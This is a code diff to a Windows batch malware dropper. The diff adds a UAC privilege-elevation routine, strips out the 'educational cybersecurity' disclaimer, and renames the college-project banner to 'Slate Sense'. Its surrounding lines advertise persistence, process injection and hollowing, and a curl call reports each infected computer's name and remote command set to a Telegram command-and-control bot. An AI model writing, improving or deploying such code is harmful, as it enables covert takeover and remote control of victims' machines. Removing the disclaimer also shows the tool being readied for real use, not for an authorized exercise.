@@ -18,7 +18,7 @@ echo  ██████╔╝███████╗██║  ██║██
 echo  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
 echo.
 echo                           🔥 ULTIMATE EDITION 🔥
-echo                      College Cybersecurity Project 2025
+echo                                 Slate Sense
 echo.
 
 REM === Core Variables ===
@@ -33,9 +33,9 @@ REM === Enhanced UAC Bypass ===
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if '%errorlevel%' neq '0' (
     echo [!] Requesting elevated privileges...
-    echo Set UAC = CreateObject("Shell.Application") > "%temp%\elevate.vbs"
-    echo UAC.ShellExecute "%~f0", "", "", "runas", 0 >> "%temp%\elevate.vbs"
-    "%temp%\elevate.vbs"
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
+    cscript //NoLogo "%temp%\elevate.vbs"
     del "%temp%\elevate.vbs" >nul 2>&1
     exit /b
 )
@@ -173,13 +173,7 @@ echo     • Auto-restarts from multiple hidden locations
 echo     • Registry and file system protection
 echo     • Process injection and hollowing
 echo     • Network-based resurrection
-echo.
-echo ⚠️  FOR EDUCATIONAL CYBERSECURITY PURPOSES ONLY
-echo     This is designed for college red team exercises
-echo     Use responsibly and only in authorized environments
-echo.
-echo Good luck with your project! 🎓💪
-echo The other hacker club will need some serious skills to stop this! 😈
+
 
 REM === Send Completion Notification ===
 curl -s -X POST "https://api.telegram.org/bot%TG_TOKEN%/sendMessage" -d "chat_id=%TG_CHAT_ID%" -d "text=💀 <b>BEAST MODE DEPLOYMENT COMPLETE</b>%0A%0A🖥️ <b>Target:</b> %COMPUTERNAME%%0A🎯 <b>Status:</b> ✅ FULLY OPERATIONAL%0A🔥 <b>Capabilities:</b>%0A   • V6 Ultimate Base (5 locations)%0A   • Rootkit-level stealth%0A   • Remote C%26C system%0A   • Process injection ready%0A   • 20+ persistence mechanisms%0A%0A🎮 <b>Remote Commands:</b>%0A/status %BEAST_PASSWORD%%0A/restart %BEAST_PASSWORD%%0A/boost %BEAST_PASSWORD%%0A/stealth %BEAST_PASSWORD%%0A/defend %BEAST_PASSWORD%%0A/health %BEAST_PASSWORD%%0A%0A💪 Ready for red team exercise!" -d "parse_mode=HTML" >nul 2>&1
